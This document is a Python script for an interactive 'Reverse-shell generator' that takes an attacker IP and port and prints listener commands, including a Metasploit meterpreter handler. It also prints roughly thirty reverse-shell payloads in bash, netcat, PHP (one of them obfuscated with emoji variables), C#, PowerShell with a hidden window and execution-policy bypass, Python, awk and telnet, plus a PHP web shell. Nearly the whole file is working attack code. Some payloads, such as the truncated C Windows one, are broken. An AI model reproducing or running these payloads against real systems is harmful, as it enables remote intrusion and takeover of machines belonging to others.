#!/usr/bin/env python3
import os
import platform
import socket
from colorama import Fore , Back , Style 
from turtle import heading
from pyfiglet import Figlet

heading = Figlet(font='big')
print(heading.renderText("Reverse-shell\ngenerator"))


# detecting system ip address
hostname = socket.gethostname()
ipaddress = socket.gethostbyname(hostname)
print("\n\nYour ip address is :"+ipaddress)

#taking ip and port number from the user
ip = input(Fore.YELLOW + "\nEnter the ip address\n")
port = input("Enter the listning port number\n")


#difining a function to display the usage guidelines
def guide():
    subheading1 = Figlet(font="doom")
# doom big eftipiti cybermedium epic larry3d mini ogre puffy 
    print(subheading1.renderText("Listner"))

    print("{:30s} {:30s}".format("1  nc", "7   rustcat +command history"))
    print("{:30s} {:30s}".format("2  ncat", "8   Windows ConPty"))
    print("{:30s} {:30s}".format("3  ncat(TLS)", "9   socat"))
    print("{:30s} {:30s}".format("4  rlwrap +nc", "10  socat TTY"))
    print("{:30s} {:30s}".format("5  rustcat", "11  powercat"))
    print("{:30s} {:30s}".format("6  pwncat", "12  msfconsole\n\n"))

    subheading2 = Figlet(font='doom')
    print(subheading2.renderText("Reverse-shell"))

    print("{:30s} {:30s} {:30s}".format("1   Bash -i" , "11  nc -e " , "21  ncat -e "))
    print("{:30s} {:30s} {:30s}".format("2   Bash 196" , "12  ncmkfifo " , "22  ncat.exe -e "))
    print("{:30s} {:30s} {:30s}".format("3   Bash 5" , "13  nc.exe -e " , "23  awk"))
    print("{:30s} {:30s} {:30s}".format("4   Bash udp" , "14  nc -c " , "24  rustcat "))
    print("{:30s} {:30s} {:30s}".format("5   Bash readline" , "15  nc -c " , "25  socat TTY "))
    print("{:30s} {:30s} {:30s}".format("6   C Windows" , "16  PHP exec" , "26  Haskell"))
    print("{:30s} {:30s} {:30s}".format("7   C# TCP client" , "17  PHP shell_exec" , "27  Powershell "))
    print("{:30s} {:30s} {:30s}".format("8   Node js" , "18  PHP system" , "28  Python #2"))
    print("{:30s} {:30s} {:30s}".format("9   PHP Emoji" , "19  PHP popen" , "29  telnet"))
    print("{:30s} {:30s} {:30s}".format("10  PHP cmd" , "20  PHP proc_open" , "30  Python Windows"))




    print("\n\nrsg listning <number of the listner type>                = to generate the listner code")
    print("rsg reverse-shell <number of the reverse-shell type>     = to generate the reverse-shell code")
    print("exit                                                     = exit")
    print("clear                                                    = clear the screen\n")
    print("ifconfig                                                 = to get the ipv4 address of your system")
    print("set lhost                                                = to set or change the ip address")
    print("set lport                                                = to set or change the listing port number")
    print("show                                                     = to print the lhost and lport")
    print("rsg -h                                                   = list the reverse-shell and listners")
    print("example:-\n")
    print("{:30s} {:30s}".format("rsg listner 4", "rsg reverse-shell 19\n\n"))


guide()


#take the input command until the user quite(exit)
while True:
    take = input("$")
    if take == "rsg -h":
        guide()
        
        
        
        
#response part for the listner request (12)    

    elif take == "rsg listner 1":
        print("\n\nnc -lnvp "+port+"\n\n")
    elif take == "rsg listner 2":
        print("\n\n ncat -lnvp "+port+"\n\n")
    elif take == "rsg listner 3":
        print("\n\nncat --ssl -lnvp "+port+"\n\n")
    elif take == "rsg listner 4":
        print("\n\nrlwrap -cAr nc -lvnp "+port+"\n\n")
    elif take == "rsg listner 5":
        print("\n\nrcat -lp "+port+"\n\n")
    elif take == "rsg listner 6":
        print("\n\npython3 -m pwncat -lp "+port+"\n\n")
    elif take == "rsg listner 7":
        print("\n\nrcat -lHp "+port+"\n\n")
    elif take == "rsg listner 8":
        print("\n\nstty raw -echo; (stty size; cat) | nc -lnvp "+port+"\n\n")
    elif take == "rsg listner 9":
        print("\n\nsocat -d -d TCP-LISTEN:"+port+" STDOUT\n\n")
    elif take == "rsg listner 10":
        print("\n\nsocat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:"+port+"\n\n")
    elif take == "rsg listner 11":
        print("\n\npowercat -l -p "+port+"\n\n")
    elif take == "rsg listner 12":
        print('\n\nmsfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost '+ip+'; set lport '+port+'; exploit"\n\n')
        
        
        
        
# response part for the reverse-shell request (30)

    elif take == "rsg reverse-shell 1":
        print("\n\nsh -i >& /dev/tcp/"+ip+"/"+port+" 0>&1\n\n")
    elif take == "rsg reverse-shell 2":
        print("\n\n0<&196;exec 196<>/dev/tcp/"+ip+"/"+port+"; sh <&196 >&196 2>&196\n\n")
    elif take == "rsg reverse-shell 3":
        print("\n\nsh -i 5<> /dev/tcp/"+ip+"/"+port+" 0<&5 1>&5 2>&5\n\n")
    elif take == "rsg reverse-shell 4":
        print("\n\nsh -i >& /dev/udp/"+ip+"/"+port+" 0>&1\n\n")
    elif take == "rsg reverse-shell 5":
        print("\n\nexec 5<>/dev/tcp/"+ip+"/"+port+";cat <&5 | while read line; do $line 2>&5 >&5; done\n\n")
    elif take == "rsg reverse-shell 6":
        print('\n\n#include <winsock2.h>\n#include <stdio.h>\n#pragma comment(lib,"ws2_32")\n\nWSADATA wsaData;\nSOCKET Winsock;\nstruct sockaddr_in hax;\nchar ip_addr[16] = " \b'+ip+'";\nchar port[6] = " \b'+port+'";\n\nSTARTUPINFO ini_processo;\n\nPROCESS_INFORMATION processo_info;\n\n')
    elif take == "rsg reverse-shell 7":
        print("""\n\nusing System;\n
              using System.Text;\n
              using System.IO;\n
              using System.Diagnostics;\n
              using System.ComponentModel;\n
              using System.Linq;\n
              using System.Net;\n
              using System.Net.Sockets;\n\n\n
              namespace ConnectBack\n
              {\n
              public class Program\n
              {\n
              static StreamWriter streamWriter;\n\n
              public static void Main(string[] args)\n
              {\n
              using(TcpClient client = new TcpClient(" \b"""+ip+""" ", """+port+"""))\n
              {\n
              using(Stream stream = client.GetStream())\n
              {\n
              using(StreamReader rdr = new StreamReader(stream))\n
              {\nstreamWriter = new StreamWriter(stream);\n\n
						
						StringBuilder strInput = new StringBuilder();\n\n

						Process p = new Process();\n
						p.StartInfo.FileName = "sh";\n
						p.StartInfo.CreateNoWindow = true;\n
						p.StartInfo.UseShellExecute = false;\n
						p.StartInfo.RedirectStandardOutput = true;\n
						p.StartInfo.RedirectStandardInput = true;\n
						p.StartInfo.RedirectStandardError = true;\n
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n
						p.Start();\n
						p.BeginOutputReadLine();\n\n

						while(true)\n
						{\n
							strInput.Append(rdr.ReadLine());\n
							//strInput.Append("\n");\n
							p.StandardInput.WriteLine(strInput);\n
							strInput.Remove(0, strInput.Length);\n
						}\n
					}\n
				}\n
			}\n
		}\n\n

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n
        {\n
            StringBuilder strOutput = new StringBuilder();\n\n

            if (!String.IsNullOrEmpty(outLine.Data))\n
            {\n
                try\n
                {\n
                    strOutput.Append(outLine.Data);\n
                    streamWriter.WriteLine(strOutput);\n
                    streamWriter.Flush();\n
                }\n
                catch (Exception err) { }\n
            }\n
        }\n\n\n

	}
} \n\n""")
        
        
    elif take == "rsg reverse-shell 8":
        print("\n\nrequire('child_process').exec('nc -e sh "+ip+" "+port+"')\n\n")
    elif take == "rsg reverse-shell 9":
        print("""\n\nphp -r '$ð="1";$ð="2";$ð="3";$ð="4";$ð="5";$ð="6";$ð="7";$ð="8";$ð="9";$ð="0";$ð¤¢=" ";$ð¤="<";$ð¤ =">";$ð±="-";$ðµ="&";$ð¤©="i";$ð¤=".";$ð¤¨="/";$ð¥°="a";$ð="b";$ð¶="i";$ð="h";$ð="c";$ð¤£="d";$ð="e";$ð="f";$ð="k";$ð="n";$ð="o";$ð="p";$ð¤="s";$ð="x";$ð = $ð. $ð¤. $ð. $ð. $ð. $ð. $ð. $ð. $ð;$ð = " \b"""+ip+""" ";$ð» = """+port+""";$ð = "sh". $ð¤¢. $ð±. $ð¤©. $ð¤¢. $ð¤. $ðµ. $ð. $ð¤¢. $ð¤ . $ðµ. $ð. $ð¤¢. $ð. $ð¤ . $ðµ. $ð;$ð¤£ =  $ð($ð,$ð»);$ð½ = $ð. $ð. $ð. $ð;$ð½($ð);' \n\n""")    
    elif take == "rsg reverse-shell 10":
        print("""\n\n<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html> \n\n""")  
    elif take == "rsg reverse-shell 11":
        print("""\n\nnc -e sh """+ip+""" """+port+"""\n\n""")
    elif take == "rsg reverse-shell 12":
        print("\n\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc "+ip+" "+port+" >/tmp/f\n\n")
    elif take == "rsg reverse-shell 13":
        print("\n\nnc.exe -e sh "+ip+" "+port+"\n\n")
    elif take == "rsg reverse-shell 14":
        print("\n\nnc -c sh "+ip+" "+port+"\n\n")
    elif take == "rsg reverse-shell 15":
        print("\n\nnc -c sh "+ip+" "+port+"\n\n")
    elif take == "rsg reverse-shell 16":
        print("""\n\nphp -r '$sock=fsockopen(" \b"""+ip+""" \b","""+port+""");exec("sh <&3 >&3 2>&3");'\n\n""")
    elif take == "rsg reverse-shell 17":
        print("""\n\nphp -r '$sock=fsockopen(" \b"""+ip+""" \b","""+port+""");shell_exec("sh <&3 >&3 2>&3");'\n\n""")
    elif take == "rsg reverse-shell 18":
        print("""\n\nphp -r '$sock=fsockopen(" \b"""+ip+"""\b","""+port+""");system("sh <&3 >&3 2>&3");'\n\n""")
    elif take == "rsg reverse-shell 19":
        print("""\n\nphp -r '$sock=fsockopen(" \b"""+ip+""" \b","""+port+""");popen("sh <&3 >&3 2>&3", "r");'\n\n""")
    elif take == "rsg reverse-shell 20":
        print("""\n\nphp -r '$sock=fsockopen(" \b"""+ip+""" \b","""+port+""");$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'\n\n""")
    elif take == "rsg reverse-shell 21":
        print("\n\nncat "+ip+" "+port+" -e sh\n\n")
    elif take == "rsg reverse-shell 22":
        print("\n\nncat.exe "+ip+" "+port+" -e sh\n\n")
    elif take == "rsg reverse-shell 23":
        print("""\n\nawk 'BEGIN {s = "/inet/tcp/0/"""+ip+"""/"""+port+""" \b";\n
 while(42)\n
  {\n
     do\n
    { printf "shell>" |& s; s |& getline c;\n
      if(c)\n
      { \n
        while ((c |& getline) > 0) print $0 |& s; close(c);\n
       }\n
    }\n
    while(c != "exit") close(s);\n
     }}' /dev/null\n\n""")
    elif take == "rsg reverse-shell 24":
        print("\n\nrcat "+ip+" "+port+" -r sh\n\n")
    elif take == "rsg reverse-shell 25":
        print("\n\nsocat TCP:"+ip+":"+port+" EXEC:'sh',pty,stderr,setsid,sigint,sane\n\n")
    elif take == "rsg reverse-shell 26":
        print("""\n\nmodule Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc """+ip+"""\t"""+port+""" >/tmp/f"\n\n""")
    elif take == "rsg reverse-shell 27":
        print("""\n\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object\n
System.Net.Sockets.TCPClient(" \b"""+ip+""" \b","""+port+""");\n
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};\n
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;\n
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n
$sendback = (iex $data 2>&1 | Out-String );\n
$sendback2  = $sendback + "PS " + (pwd).Path + "> ";\n
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n
$stream.Write($sendbyte,0,$sendbyte.Length);\n
$stream.Flush()};\n
$client.Close()\n\n""")
    elif take == "rsg reverse-shell 28":
        print("""\n\npython3 -c 'import os,pty,socket;s=socket.socket();s.connect((" \b"""+ip+""" \b","""+port+"""));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'\n\n""")
    elif take == "rsg reverse-shell 29":
        print("\n\nTF=$(mktemp -u);mkfifo $TF && telnet "+ip+" "+port+" 0<$TF | sh 1>$TF\n\n")
    elif take == "rsg reverse-shell 30":
        print("""\n\nimport os,socket,subprocess,threading;\n
def s2p(s, p):\n
    while True:\n
        data = s.recv(1024)\n
        if len(data) > 0:\n
            p.stdin.write(data)\n
            p.stdin.flush()\n\n

def p2s(s, p):\n
    while True:\n
        s.send(p.stdout.read(1))\n\n

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n
s.connect((" \b"""+ip+""" \b","""+port+"""))\n

p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)\n\n

s2p_thread = threading.Thread(target=s2p, args=[s, p])\n
s2p_thread.daemon = True\n
s2p_thread.start()\n\n

p2s_thread = threading.Thread(target=p2s, args=[s, p])\n
p2s_thread.daemon = True\n
p2s_thread.start()\n\n

try:\n
    p.wait()\n
except KeyboardInterrupt:\n
    s.close()\n\n""")
        
    elif take == "show":
        print("IP-Address            :"+ip)
        print("Listning port number  :"+port)
    
    elif take == "set lhost":
        newip = input("Enter the ip address\n")
        ip = ip.replace(ip , newip)
        print("lhost        :"+ip)
        print("lport        :"+port)
        
    elif take == "set lport":
        newport = input("Enter the listing port number")
        port = port.replace(port , newport)
        print("lport        :"+port)
        print("lhost        :"+ip)
    
    elif take == "clear":
        a = platform.system()
        if a == "Windows":
            os.system('cls')
        elif a == "Linux":
            os.system('clear')
            
            
    elif take == "ls":
        guide()
        
        
    elif take == "ifconfig":
        print("IPV4 Address :"+ipaddress)
        
        
    elif take == "ipconfig":
        print("IPV4 Address   :"+ipaddress)
        
    elif take == "exit":
        break